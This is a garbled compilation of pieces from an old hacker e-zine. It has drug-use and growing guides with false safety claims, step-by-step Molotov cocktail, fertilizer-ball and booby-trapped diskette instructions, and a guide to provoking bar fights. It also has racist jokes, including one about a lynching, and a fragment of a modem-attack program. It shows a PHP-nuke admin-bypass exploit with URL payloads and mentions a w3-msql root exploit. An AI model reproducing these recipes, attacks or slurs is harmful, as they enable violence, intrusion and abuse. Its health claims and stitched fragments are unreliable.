Philly blunts, but I always unpack and stuff. This is a time-honored 
tradition, at least where I live, the Central-Eastern Coast. Im actually 
somewhat the "North Coast" if it exists, living in Chicago, IL. I only know 
one person who tears open blunts, but he is a certifiable retard, because 
he uses tape to seal the blunts.. and smokes the tape, saying its all 
natural. This man also talks as if he was "Big Poppa Mary Jane King God," a 
mystical rastafarian god who knows everything there is to know about weed. 
To disprove this, I simply had him buy me an eigth, which he a) got 
completely ripped off on, b) it was shitty weed, c) it was 1/2 seeds, and 
d) he was proud of his accomplishment. I refused to pay for it, and he got 
all ticked off and said he smoked it himself, and I simply said "I bet." If 
you want to know who this is his initials are TM, and he goes to school in 
Illinois. North Shore. Thats all Im givin you.

Anyway now that we have covered blunts, its time for fun marijuana facts. 
Apparently it makes your penis larger. Note: this is a joke, but if you 
want to try, go ahead.

#lpsg log
[12:20] (dan0): hi guys

[12:25] <dan0>: holy shit

Another fun fact is its safer than cigarettes. This is TRUE. Cigarettes 
have nicotine, which is addictive. Cigarettes are also very harsh, and the 
carbon monoxide and nasty tobacco and all that shit can hurt your lungs by 
covering them with tar. I saw some pretty nasty pictures of hardcore 
smokers from this "anti-everything" fruit who came to our school. Its like 
in Clerks, where the guy pulls out the lung. Wow. Anyway, weed is a lot 
safer, especially out of a bong since the smoke is cooled down, and some of 
the nasty shit is filtered out. Ill try to conduct some sort of research on 
this tomorrow, as I am plum out of weed today.

Another great weed fact is that no, its not just green. Theres red, purple, 
green, and I think a few others. Ive only seen the red and green buds, I 
dont know if the purple really exist but my friend claims so. Living where 
I am sucks, I get commercial weed for high prices..

Ok, today is friday. I am going to a party on saturday in which I will test 
my hypothesis with a filter. Here is my.. scientific experiment crap:

IDEA: To test whether Marijuana (straight out of paper, in "joint" fashion) 
is safer to consume than Tobacco (in cigarette form). I have read from 
various resources that it is true, but plan to test it myself. The context 
of safety Im using is tar and other harsh chemicals transfered in the 
smoke.

METHOD: Im going to use a small "smoking filter" which smokes the cigarette 
and deposits the chemicals in the smoke into a white patch. Whichever has 
the more brown/black residue obviously has more abrasive chemicals. This 
experiment should be quite obvious, but some people still believe weed is 
"dangerous."

DATA: Oh shit, ok, so I forgot the experiment and just got fucking blown, 
but lemme tell you it worked just fucking fine... nice and sweet buds.. oh 
Im gonna go for another toking session in like 20 minutes..

CONCLUSION: Weed is fucking smooth.


Some more random shit. Last time I neglected to mention a device I used 
while trying the experiment. The steamroller. Fuck the gravity bong, the 
gay plastic bag bongs, the stupid home made bullshit, you need this and 
some bud, and youre fucking set. Step 1, find a metal pipe about the width 
of a fucking fat joint. Now, get a tiny screen that will cover one end with 
room to pack some weed. Now, pack the weed, and pull like a fucking hobo. 
You need iron lungs and experience, you will definetly hack up a lung if 
youre new. Fuck, you get blown like a leaf in the wind, you will go (EXCUSE 
THE RACIAL COMMENT, CAM2O!) chinese on that fucker. Yes, that was a rude 
racial comment, but I used the word retarded too much. For those who dont 
get it, asian americans have stereotypically "slanted" eyes, and when youre 
stoned you get all squinty and "look chinese." Sorry! Fuck you all! Go get 
stoned!

Data (ICQ 53314246): I think a good idea for a story would be to have a 
parrot that was raised by eagles,it would be cute cause the parrot can't 
act like an eagle and then in order to keep the story from getting boring 
add some pornography,then at the end have the parrot flying off and see two 
parrots and start to attack then,but its his parents,then some more 
pornography.

This is another complete guide to MY FAVORITE GIRL BESIDES MY GIRLFRIEND! 
Yes, my girlfriend is more important than Mary Jane, much more, because 
mainly my girlfriend is hot, and mary jane is a PLANT. Ok, well first off I 
want to keep doing the introductory things, bringing new people to the 
experience. This first part will be for you kids who have never smoked.

ITS A WONDERFUL THING. If you have a girlfriend, its great to sit and chill 
with her whilst high, especially if a) she is too AND b) shes ok with you 
smoking. This posed a problem for me since my girlfriend a) doesnt smoke to 
my knowledge and b) hates when I smoke cigarettes or blunts or whatnot. 
Remedy? Give up smoking tobacco products and only get stoned when shes cool 
with it. Anyway, I always sidetrack in my articles, so good thing I got it 
done early. Smoking weed is a wonderful thing, theres nothing criminal 
about it. My first fear was what I would feel like, what would a "high" be. 
For me, a high is usually a few hours of unbridled comedy. Always smoke 
with people you know, you will end up being best of friends, you will laugh 
at every joke. Personally I have a very low tolerance for any drugs, 
including weed and alcohol, so after a few bowls I will be absolutely 
retarded. This is not a good thing if you're trying to act suave around a 
girl, because you will end up looking like Jerry Lewis. There is no harm in 
it, except if you have some sort of weak lung or heart. Want to know how 
many documented cases there are of people dying from an "overdose" of 
marijuana? ZERO. Yes, not one fucking person has died, because you cant, 
its like smoking a shitload of cigarettes. I do know people who have asthma 
but still smoke, and they do fine, even though it is far from healthy.

The next general newbie question is "well what if my parents or a cop finds 
out Im stoned." Impossible, unless you are trying to do the funky chicken 
on a parked police car, which I can personally say is quite fun. You do not 
smell of weed after smoking it, unless you were hotboxing, which is locking 
yourself in a closed place with a smoking device, kind of like a steam 
room. If you walk around for about 10 or 15 minutes after smoking the smell 
will dissipate (it is a very faint smell) and you shouldnt worry. The only 
giveaway is red eyes, which can be fixed with Visine or Clear Eyes.

The last newbie fear is a silly one, and that is embarassment. If you have 
never smoked before, make sure you smoke with someone who has your first 
time, so you know what the fuck to do. They will happily answer questions 
on anything, weed is a very fun topic. Ask about local prices, whos got the 
sticky ickies and whos got the stinkweed, or just how to roll joints and 
blunts. So remember, no matter how inexperienced you are, its ok to ask 
questions and act like a newbie.

Now, we move to more important things.

Last time I said you can unpack a phillie blunt and repack it with weed, 
and I got an email from an unidentified stoner saying "no man you slice 
em." Yes, you can do that, it does burn slower and wastes less. What you do 
is simply take a razor, slice down the length of the blunt, dump the 
tobacco, put in your sifted (take out stems, twiggs, seeds) weed, roll it, 
give it a lick and smoke. Some people prefer these retarded rolling papers 
that use blunt casings, they have honey and weird stuff in them that make 
them sweet, and easy to close, but Im not such a classy person..

Now, you probably know all sorts of shit about how to smoke weed, but what 
about obtaining it? This is the key part, the very very crucial part, 
unless you enjoy smoking an empty pipe. There are a few common courtesies 
associated with buying weed. If you dont have a dealer, ask your friends if 
they have dealers you could use, dont just randomly go up to people asking 
for weed. If you have the number or address of a dealer, dont ask for shit 
over their phone or go up to their house and ask, you *must* respect their 
privacy because you dont know whos listening. Next, when buying the weed, 
its nice if you smoke a joint with the dealer to close the transaction. The 
last thing you want is a pissed off dealer lacing your shit with fucked up 
drugs or just cutting out on you. Next, when smoking, you have to always 
abide by these rules:

1) NO LIPPING THE JOINT, BONG, PIPE, BLUNT, OR ANY OTHER THING. This means 
dont slobber on it, just lightly put the outside part of your lips on it 
and pull. If youre too retarded to pull normally, you deserve to be smacked 
around.

2) THOU SHALT NOT BOGART THE JOINT, BONG, PIPE, BLUNT, OR ANY OTHER THING. 
Bogarting is the act of taking way too many hits, going out of turn, or 
smoking someone elses weed without them knowing of it. You will get your 
ass beat royally, and possibly kicked out of the bong session, if not for 
just one round.

3) IF YOU ARE AROUND PEOPLE YOU DONT KNOW, DONT BE A RETARD. I have seen 
countless cases of my friends running around the local mall full speed 
playing tag, then getting yanked around by mall security. True, they cant 
do shit, but if cops come and see you being a retard, they will have 
probable search rights and pat you down for your bag or something. Also you 
dont want people to know youre stoned, no matter how hilarious it is. One 
day me and my friend walked around school telling everyone that we were 
stoned, and while we did laugh our ass off the entire time, we got a lot of 
odd stares from teachers overhearing parts of our conversation.

4) Dont ever fuck with the new kids. I was smoking with a friend and his 
friends, and one of my other friends, and when I got up to grab some food 
they actually had convinced him to try a glass of bongwater. He never 
wanted to speak to me again, for good reason. You are going to mess around 
when stoned, but try to keep it normal, and not go nuts. My friend Haider 
once tried to show me how I could theoretically cut off my arm if I wanted 
to, which scared the shit out of me. If you ever hear the words "Just hold 
still! IF YOU KEEP MOVING ILL FUCK IT UP!" run away very fast and dont ever 
smoke with that person again.

5) Dont, and I mean dont you EVER fucking try, to steal weed. If you see a 
bag lying around in an open place, even if you know you can take it, LEAVE 
IT. This is a bitch thing to do, and people get very protective of their 
shit. If you decide to skimp off the bag, it will be noticed, and that 
person will come looking for you. Weed is a precious commodity in these 
times, ya never know what stupid shit a stoner would pull for his bag.


Now, this article is getting long and I hate long articles so Ill leave the 
last part up to an outside source. Growing weed is crazy, you need space, 
no visitors, a lot of equipment, and patience. The best guide I have found 
is also in this issue of b0g, it even has a few recipes for cooking weed. I 
have never attempted to grow weed except for a few shoots in my drawer 
right now (im taking after this guide) so dont email me about that. Thats 
all for now, until next time, au revoir, salut, ciao, cya...

MARIHUANA: HOW TO GROW IT, REAP IT, AND COOK IT. 

Marihuana is available anywhere in the
country, as the black market is widespread and thriving very well.
   There are many different methods of growing marihuana, and it seems 
everyone has just discovered the best fertilizer.  I could not relay all 
the methods in five books, so have settled for the technique that has been 
proven most successful.
  Most seeds are fertile, but the best are from Mexico. Never under any
circumstances throw seeds away, since marihuana is a weed and will grow 
almost anywhere. The first step is to soak your seeds overnight in clean, 
lukewarm water. YOur container should be a standard planter box. If this is 
not available, a plastic dish tray about two inches deep will serve uset as 
well.
Fill the container with washed fine sand and shredded sphagnum moss. If 
this is not readily available, you can use regular soil. The soil should be 
packed firmly, and watered well so that the excess water is allowed to run 
off. Dig furrows the full length of the container about one-half-inch deep. 
Now you are ready to sow your seeds. Do so every inch. Fill in each furrow 
with soil, sand, moss, and water. Cover the container with a clear plastic 
sheet, and place it in a warm location where there are at least six hours 
of sunlight a day. The plants now remain on their own until they develop 
their first true leaves.
  Even it the material above is not available, almost the same degree of
success can be accomplished by placing the seeds on several layers of water
soaked paper towels. Now cover the seeds with a plastic sheet jsut as 
above, and expose to sunlight.
   In about one week, signs of life should start to appear. Within two 
weeks, definite little leaves should be present. This is the time to 
transplant.  The plot you intend to use for your transplant should be 
carefully prepared.
Manure should be used for at least one week in advance of the actual
transplant. The soil should be similar to the original soil used in the
germinating box. All other weeds, in the general area of your plot, should 
be
pulled to allow your plant as much freedom as possible.
   The original germinating box should be watered the day before you are 
going to transplant, so as to make the move easier and less traumatic on 
the plants. The plants should be placed in holes two to three inches deep, 
depending on the size of the plant. The earth around the plant should be 
loose, and if possible, some earthworms should be added. If there is a lack 
of sunlight, a simple ring of tinfoil around the plant can be very helpful. 
The first few days are the most critical after the actual transplant. If 
the plants survive the shock, there should be no reason why they shouldn't 
grow into healthy, fully grown plants (which means, in certain climates, 
fifteen to twenty feet high).
   Very little care is needed after this stage, with the exception of
fertilization. For fertilizers, one can use manure, soluble nitrogen, 
nitrate of soda, sulfate of ammonia, or rotting garbage (which has always 
been popular).  To produce a stronger plant, on can clip off the lower 
leaves; do this only when the plant reaches a height of at least three 
feet. The ground surrounding your plant should be kept clear of other 
weeds, but strangely enough, insects ignore marihuana and do virtually no 
harm.   As a rule, it is better to wait until the plants have gone to seed 
before they are cut, but if you're greedy, you  can kill the goose that 
laid the golden egg.  The best agent for drying is the sun, but if you live 
in the city it could prove embarrassing and dangerous to have five- or ten-
foot pot trees on your fire escape- in this case a sun lamp can be used. 
When using the sun, drying usually takes about two weeks. With a sun lamp, 
the pot is smokable after only three or four days. When drying is done, 
separate the leaves and crush them. This will be the finest smoke, unless 
you have a female plant. If so, save the blossoms for the most potent smoke 
there is. The stems and twigs can be chopped up and smoked in a pipe, or 
sold to a friend.
   Grass is basically a weed and can be grown anywhere, including indoors 
with artificial light. A sun lamp works well from a distance of two to 
three feet.
For an interesting experiment, use infra -red light on part of your crop 
and a sun lamp on the other part, then compare. A bathtub or cement mixer 
is an ideal planter for the city dweller.

tennis ball bomb 


	First off, you will need a tennis ball.  New or old, it does not make 
a difference.  Then cut the ball in half.  Fill one half with fertilizer.  
Leave a little hole in the tennis ball so a fuse can be fitted into
it.  Now glue or tape the halves together.  For a fuse you can use a strand 
of toilet paper.  With the fuses, get creative.  Dip them in gas to make 
them light faster, get different materials, whatever you like. 
Make sure the fuse is sticking out of the top by about three inches.  You 
wouldn't want it to blow up in your hand.  That may leave you with only a 
half of your face and one hand.  Then, stick the fuse in the ball and light 
it.  Then your ready to throw.  The effect of these bombs is not 
devastating.  It will only shoot flaming pieces of rubber at people.  But 
just because these bombs can't take out buildings I suggest you are
very careful what you do with them.  




 molotov cocktail 


  Molotov cocktails are a very effective way of getting rid of things.  I 
am sure you have seen them before.  They are frequently used in riots and 
other violent outbreaks.  This bomb has been tested by doh and let me tell 
you, this is a must.  What you need is a piece of a rag, a beer bottle, and 
some gasoline. Now take the bottle, and fill it with about two inches
of gasoline.  Now take the rag and stick it in the top of the bottle 
leaving half of the rag hanging out of the bottle.  Then, put your hand 
over the top of the bottle securing the rag.  The rag will get doused in
gas.  Then take the rag out and put the other/dry side of the rag in the 
bottle and douse that.  You are now ready to go.  Take a lighter/match and 
light the rag. It will go up very fast because of the gas (for all
you jack asses that don't know gasoline is flammable). As soon as it is 
lit, throw it.  The bottle will break and the gas will spill out and soon 
enough catch fire when the burning rag hits it.  Once again, do not
hold the bottle.  Pressure will build up inside making a more powerful bomb 
and it will explode with a grenade's effect.  The glass will shoot off like
shrapnel and if it hits you, you're gonna get ripped up pretty bad.



diskette bomb 

	
For this recipe your going to need a diskette and a few matches and of 
course a stupid victim, take the diskette and take the sliding silver piece 
off carefully without bending it much cause you are going to have to put it 
back on and make it look like its in perfect condition, then with your 
nail, a knife, or a envelope opener carefully separate the disk into two 
different pieces the top and the bottom.  Next take a five matches and 
scrape all of the sulfur off into the inside of the disk.  Next close up 
the disk and place the silver piece back onto the diskette.  Make sure
you close it up so it looks like it was never opened. Now when you give 
this to some idiot tell them to insert it into the floppy drive and when 
computer reads the disk it will spark and the sulfur will spark and flame.  
Bye, bye computer.

 ____________________________________________________________________





	Hello hax0rs.  AcidKick here reporting live from the home of 
the famous haxt0r RLoxley.  I am here to tell you about why RLoxley 
is my favorite person on earth.  I am sure some of you are thinking 
"DOUBLE-U TEE EFF IZ TH1S B14TCH SM0K1NG!#$@", but I kid you 
not...RLoxley truly is my favorite person in the world, and in the 
b0g exclusive I'll tell you why.
	
Reason Numero Uno: He is elite.
	No that isn't a misprint in b0g.  RLoxley is elite.  That mans 
eliteness cannot be surpassed by anyone else.  I mean when I am 
masturbating and thinking of the word "elite"...RLoxley is what 
comes to mind.  He defines elite in the best way, the haxt0r way.  I 
am beginning to think that he may actually be Dade Murphy (aka 
z3r0c00l), but I'm not sure as he denies this.  If that is the case, 
I take great pleasure in knowing that I have been kick/banned from 
#hackphreak by zerocool.  That is the greatest feeling anyone can 
have, aside from hacking the gibson of course!@#  This man is truly 
elite, and he's fat too.  It's all right that he weighs a lot, 
because he's elite.  There are fat people and there are cool fat 
people...RLoxley defines cool fat people.

Reason Number Two: He coded hacktheplanet2000.exe
	THAT'S RIGHT I SAID IT!@$#% It has come to my attention that 
RLoxley himself is the person who coded hacktheplanet2000.exe.  Now, 
this came as a great shock to me, I never thought that I, acidkick, 
would actually speak to the creator of this truly 3133(5+2) program.  
This may have been a secret, but here in b0g you the b0g reader is 
getting first hand 0d4y information.  The hacktheplanet2000.exe 
programmer has been discovered...and his name is RLoxley.

Reason Number Trois: He is Bill Gates.
	RLoxley is actually Bill Gates people.  This may be hard to 
believe, but believe me because I'm right and if you don't listen to 
me you will be punished.  He IS the one who coded Windows3.1 aka the 
OS of the future.  I mean we all know that Windows3.1 will soon take 
over as everyone's OS of choice and this is a direct result of the 
hard work of RLoxley.  If it wasn't for his mad technique nobody 
would be able to use Windows3.1 and the world would be lost.  We all 
owe something to RLoxley for his great achievements in the realm of 
creating software monopolies.

Reason Number Four: He can code in BASIC.
	No explination is really needed here.

	That is all I have for you today my friends, for the next 
issue I might actually write an article longer than a few hours 
before b0g is set to come out so I can spend more time on it and 
make it more l33t.  Shouts to all of my brothers at b0g, #dps, 
#lactose, #hacktech and everyone that is cool.

60-80 - Nothing to really worry about. Force them to listen to several 
hours of hard metal and all worries should fade away
40-60 - Now it's getting bad. Go into their room, take every rap CD and
snap them half. Or sell them as coasters, that's all they're good for. 
Then have a big fubu bonfire in their front yard.
20-40 - Yeah ok. Your friend is a wigger. Find a new best friend.
0-20 - Your friend couldn't get any blacker without painting his face. 
Get that pointy white hood, cause it's time for a hanging. Trust me. 
It's the only way to save him.

First things first... in order to get you motivated it is essential that 
you download http://www.b0g.org/ringland_barmyarmy.mp3 written by me with a 
fake accent h0h0.
once you've listened to it a few times you should be pumpin for ruckuz. 
phone your mates wee john, andy, steve, and kev and meet down the local in 
30 mins. This is where the tekneeq comes in, scan the pub for wankers/hard 
cunts. a typical wanker would be a nob wearing gay clothes and being loud 
as fuck. a hard bastard would be a hard bastard. walk over to the guy and 
barge into him spilling your pint on him. He should say "You fucking prick 
I’m soaking." then you reply with "oh aye?" at this point, the ruck is 
about to start, your mates should keep a good watch incase you start 
getting a doing and they can jump in, this could result in a full blown bar 
ruck where everyone has a dig and a mad ruck breaks out, (wicked) or just 
either you or the other guy gets a kick in and that’s that or you both get 
thrown out, ruck in anyway you think is feasible.
A way to start a bar ruck is the following. you should take advantage of 
the local's in the pub. they will have grown a fond liking to the bar man.

a) go to the bar and ask for a pint
b) the bar man will pull it and ask for money
c) take a drink and spit it out saying "THAT’S FUCKING RANK"
d) scoop the bottom of the pint  upwards towards the barman’s head 
resulting 
in a smash. At this point the locals will all come for you. MAD ruckuz 
ahead.....


misc. ways to start a ruck
1. throw a stool over at a table where people are sitting and come flying 
in with a headbutt (the people at the table will be thinking "WTF(*^()^$""
2. go to the toilet and if someone goes in a cubical for a dump or 
whatever, 
wet some toilet paper and throw it over the top trying to hit him, better 
yet, if there is a gap on the top of the cubicle pull your self up so u can 
see over it and fire a soggy paper b0mb down aiming for his face. he should 
come out pretty steamed, have a small one at the ready and throw sharply in 
his eyes, attack while he’s stunned
3. a simple and effective way is to try it on with someone’s girlfriend. 
when the guy notices, and comes over, lay into him.
4. being rowdy as fuck will result in you maybe getting thrown out by 
management, excellent. cos you can attempt to ruck the big fuck off 
bouncers. 
warning : may prove fatal.
5. the easiest way is, if you see a bloke with his bird, when she goes to 
the toilet or when she fucks off for whatever reason go up to the bloke and 
say "that your bird mate?" he will respond "yeah". then you say "ahh, cos I 
fucked that ugly SKANK LAST NIGHT " a ruck will break out in one way or 
another h0h0

that’s it.. I don’t condone mindless rucking. it ruins peoples night and is 
fucking stupid. there’s nothing better than a good ruck when there’s a good 
reason :P . I wrote this article/mp3 as a piss take. --Bruk0ut

Number 1:- The Shotgun (also called the Shottie)

This is an absolute little bastard that will seriously mess u up, no joke, 
if done correctly, this is a bitch.

Ok, tools u'll need:

A plastic bottle, the bigger the better
Water
A metal tube that's about 8 cms long, and 1 cms wide (if u dun have 1, I'll 
explain how to make)
Cannabis, either crumbled, leaves, or block, all are good
Tobacco (don't worry, u won't be smoking it)
A knife

Instructions to make the tube:

Right, to this part, you'll need a can of Stella, a knife and some tape.  
Cut either end off the (EMPTY) can of stella, leaving u with a fat tube.  
Cut down one side of this and flatten it out, it should be a square shape.  
Simply roll this piece of metal into a tube of the above specifications, 
and secure in place with tape.

Instructions to make the Shotgun:

Now, this is a proper shottie, not one of the shitty little things that 
people have no time or care to make.  First, cut a hole large enough for 
the tube to fit snugly into, about 2 inches from the bottom of the bottle.  
now, take the tube, and pack it half way with tobacco, but leave about a 
centimetre at the top of that half free (see diagram)

|xxxxxxxxxxxxxxxxxxxxxxxxxxxxx|
|spacespacespace|tobacco|space|
|xxxxxxxxxxxxxxxxxxxxxxxxxxxxx|

now, take your pot, and place a desired amount in the space above the 
tobacco (the more the pot, the harder the hit).  Get a friend to hold the 
tube.  Take the bottle, and hold it on a slope and fill it part way with 
water, so that the water doesn't pour out of the hole.  Take the pre-
prepared tube and place through the hole, down, into the water, so that the 
half with no tobacco or pot is in the water, and the other half is pretty 
much outside of the bottle.  Seal round the edges with blu-tac or 
something.  

What to Do:

Holding the bottle at a slope, to avoid water spillage, put the top to your 
lips.  Using a lighter, light the pot in the top of the tube, and suck 
GENTLY.  The sucking should pull the flame down onto the pot, and the smoke 
from the burning pot will be pulled through the tobacco, bubbling through 
the water, and into the rest of the bottle.  Wait until the smoke in here 
gets relatively thick (so thick u can't see through it).  Stop sucking, put 
your hand over the end, and have a look at what's about to pour into your 
lungs!  Put your mouth back to the top of the bottle, and suck HARD.  The 
strong suction will suck the tobacco down, into the water, thus making the 
hole through which air can be pulled considerably larger.  This will suck 
all of the smoke in the bottle straight into your lungs.




Number 2:- The Bucket

Ladies and Gentlemen, boys and girls, this is relatively simple to make, it 
does, however, take patience, and more than 1 person.  The effects are, 
however, as I'm sure you'll agree, quite, quite devastating :))

Ok, tools u'll need:

A bucket (duh)
A plastic bottle 
A knife
Tin foil
A lighter
The weed of your choice (although solids and skunk work best)
Water

What to do:

Oh, the wonders of science :)  Get yer bucket, and fill it with water.  
Leave it outside so it'll be nice and cold.  Take the plastic bottle and 
cut off the bottom of it.  Throw this part away, or use as an ashtray, up 
to you :)  Take the tin foil, and place over the top bit of the bottle 
(what's that bit called?  The bit the lid/cap goes on?  Any comments to 
Trionix@hackuk.com).  Get the knife, and pierce small holes in the tin foil 
(VERY SMALL), making sure that the holes stay VERY SMALL.  Now, get your 
dope and lighter ready, and go outside.  

Place the bottle in the bucket, ensuring it fills completely with water.  
Put the dope in the tin foil (with the holes in it) that's over the neck 
(THAT'S IT) of the bottle.  You'd better hope the holes were small.  Get 
one of your mates to light the dope, whilst you SLOWLY pull the bottle out 
of the water.  SLOWLY.  Keep the dope lit, and if it all works properly, 
the suction of the water leaving the bottle to go back in the bucket should 
draw the smoke down, into the bottle.  Keep lifting the bottle out of the 
water, taking care not to drop it (that's what happened on my first bucket, 
I actually could have cried).  Once the bottle is almost totally out of the 
water, take off the tin foil, and place your hand over the top.  This is 
the fun bit.  Keeping some of the bottle underwater, put your mouth over 
the neck of it.  Now, push your head STRAIGHT down towards the bucket.  As 
the bottle goes underwater, the smoke inside it needs to go somewhere, and 
as your mouth is the only place it can go....BREATHE IN HARD!!!  


Very time-consuming, I know, but the water cools the smoke right down, u 
barely even feel it going in, but you'll know it did! 



Number 3:- The Lung

Known by many to absolutely WRECK your mouth, throat and lungs, and make 
you cough like a bitch, the lung is one of the deadliest toys u can play 
with. No, really, this actually made me drink alcohol.  Anyone who knows me 
KNOWS I don't EVER drink, but I needed to extinguish my throat.  Give it a 
go though :)

Ok, tools u'll need:

A plastic bottle (suprise suprise)
A plastic bag
Tin foil
A knife (suprise suprise)
Cannabis (preferably solids)
Sellotape

Yet again, we need to cut the bottom off the bottle, do what u want with 
the bottom, but we won't be using it :)  Now, take the plastic bag, and 
push it right inside the bottle, with the handles left outside.  Move the 
bag about a bit, until it's pushed against the sides of the bottle, and u 
can like, put your hand inside it, while it's in the bottle.  Now, leaving 
about 2 inches spare, cut the bag off, so that you've cut off the handles 
and the top of the bag.  Throw away.  Take the spare 2 inches of bag that 
should be hanging out of the tube, and fold them around the end of it.  
Tape these down VERY tightly, so no air can get in or out.  Now, place the 
bottle to your lips and blow hard, and the bag should shoot out the end, 
full of air.  This is your lung.  A mate of mine actually managed to get 
his mum to help him make one, claiming that it was a science project.  No 
joke, deadly seriously, she actually didn't realize. 

Push the bag back inside the tube.  Take the tin foil, and place over the 
top of the bottle.  Pierce VERY small holes in the foil, VERY SMALL HOLES.  
Place in the foil, that should be kind of in the neck of the bottle, the 
cannabis of your choice.  Get a friend to light the pot, while you slowly 
pull the bag out of the bottle, VERY SLOWLY.  This will draw the smoke 
down, into the bottle.  Wait until you've pulled the bag all the way down, 
and remove the tin foil.  Place the neck of the bottle in your mouth and 
SUCK HARD!!  As you suck, the bag will be pulled back into the bottle, 
forcing the smoke into your lungs :)



Number 4:- The Carrot Pipe

This text will be a little shorter, as a carrot pipe is very quick and very 
easy to make.  The juices from the carrot cool the smoke right down, u can 
barely even feel it go down!

Ok, tools u'll need:

A carrot (funnily enough)
A knife, or something you can scoop the inside out with
Cannabis, any is good (as always!)
Tin foil
Tape

What to do:

Simply take the carrot, and chop off the thin end.  Now hollow out its 
inside, going from the thin end to about a centimeter away from the other 
end.  Above where you finished this hole, dig down with another hole, to 
connect the two up.  This is your pipe, however, like this it is no good.  
You now have to make a decision, joint or just pot?  If you choose to use 
joints with your pipe, please see i) and if u choose to use just pot, 
please see ii).

i) Joints. Right, at the moment, the inside of the carrot is MAD wet, and 
there's nothing more annoying than a wet butt on a joint, we've all been 
the victim of someone bumming a joint, and it's not a pleasant experience.  
To get rid of the wetness, simply hold the side hole u made over a naked 
flame, like a candle or a lighter, and wait for it to go black, inside and 
outside the hole.  Now, blow HARD down the thin end of the pipe to get rid 
of all the carrot bits.  Take your pre-rolled joint and place in the now 
completely dry hole.  Suck hard on the thin end.  The smoke is pulled down 
from the joint, through the carrot, cooled my the carrots juices, and goes 
straight into you!  Please see iii)

ii) Just pot.  Hmm, the little more complicated one, but each to their own 
I guess.  Take the tin foil and tear a square large enough to completely 
cover the hole in the side of the carrot.  Tape down this foil around the 
edges of the hole.  Now, using the knife, make VERY small holes in the tin 
foil, this acts as your gauz.  Crumble into the foil whatever you wish to 
smoke, and put the thin end of the carrot in your mouth.  Hold a flame over 
the cannabis, and suck HARD.  The sucking will pull down the flame, 
lighting the herb, and sucking it down into you, having fortunately been 
cooled by the carrot's cooling goodness!  Please see iii)

iii) Remember the Golden Rule kids! DON'T COUGH!!!

With a little experimentation, this little bitch can be very powerful, but 
you can't even feel the smoke go down.  One of my favorites!  Have fun 
y'hear?

yo jp

im so happy to see that you finally managed to get your mailbag up and 
running again. once again my mondays will seem just a tad less meaningless.

im suprised nobody has commented on your sites "new" layout.
personally i this its two steps back, but then again i know you did it just 
so you can make all the 0day leet lynx hax0rs lifes hell by refusing them 
to browse your site.

next, mr kevin, let his name rest... i think we're all sick and tired of 
hearing about him day in and day out. its getting like the whole 
clinton/monica deal, but without the sexy cigars.

now all you need to do in order to get the leetest security related site on 
the net is to provide a tiny link on the main page each time we at 
http://www.b0g.org release a new issue of our totally free non-profit 
online security magazine. well atleast you can add it to the eye on the 
underground section.

yours in cyberspace

 *  hexmod.c version 0.0.1            
 *            Coded      by sour
 *            Touched up by niffum
 *
 *  About: simple script that plays around with SOME other dialup 
 *         modems. YES this has been known for a long time, i just decided
 *         to add some more nice features.
 *         Cheers to niffum for the hex modifications, moono for some of 
the
 *         code, and phase5 for the wakeup calls every 2 hours of the 
night.
 * 
 *  Usage: gcc -o modhex modhex.c  
 *   
 *  Note : with Type 8 (Custom) make sure that you dont exceed the 16
 *         character limit, unfortunately we can only play with 16 
characters
 *         which is kinda hard to keep under. You can however, write to the 
 *         modems memory using the &W for write. I have made it easyer for 
you
 *         so you just do ./modhex 8 +++ATH0ATDT000 ip.ip.ip.ip, have fun. 
 *        
 *  Type 1  +++ATH0            - Tested and working

Disclaimer: I am not responsible for whatever you do with the knowledge
you get from reading this advisorie. I am not telling you to go and post
messages on sites that use PHP-nuke.

Recently there was an advisory on bugtraq about An access validation error
that exists in PHP-nuke Web Portal System. With this bug it is possible
for a remote user to gain administrative privileges.
http://www.target.com/admin.php3?admin=anything

The above example lets you login as the administrator. But you cannot do
anything with that url alone. When you click on anything in the
administrator's control panel you get asked for a username and password.
I have found a way to bypass this.

http://www.example.com/admin.php3?admin=anything&op=PostAdminStory&introtex
t=evil%20hacker%20message

The Above example lets you post a topic on the main page as an
administrator. You can add html tags to it. And a topic.
To seperate the text you want to display you use '%20' without the ''.
You could also put html in the message and make the whole front page
redirect to some other page. Anyway you get the idea.

You can also edit the existing admin accounts by doing:
http://www.example.com/admin.php3?admin=anything&op=mod_authors

With &op= whatever is in teh administration menu you can control
everything that it lets you. I will not go into anything else. I just
wanted to show you how to post as an administrator and leave the rest up
to you.

The patch for this bug is available at:
http://www.ncc.org.ve/php-
nuke.php3?op=download&location=http://download.sourceforge.net/phpnuke&file
=PHP-Nuke-3.0.tar.gz

You can post this text on any page as long as you give proper credit to
me: Starman_Jones.

Hello, this is grphish
i found out that any user can easily get an xterm with root permissions
just by using a simple exploit that exploits w3-MSQL.
If your interested in securing it here's the patch:
----- w3-msql.patch ---------

               410c410
               <     scanf("%s ", boundary);

This summer pretty much sucked.
Nothing really happened, I didn’t get to go to any cool festivals or 
anything, and most important, I didn’t get laid!

I made a button you guys can use to link our site.
Get it at http://www.b0g.org/b0gbutton.gif
We’re madly grateful :D

I don’t normally check the hosts of the people that visit our site, but I 
found two cool ones this week:

A visitor from tide75.microsoft.com (131.107.3.75) was logged twice,
starting at  2:24:04 PM on Thursday, August 31, 2000.
The initial browser was Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0).
  This visitor first arrived from www.b0g.org/403.shtml
    and visited www.b0g.org/index.shtml
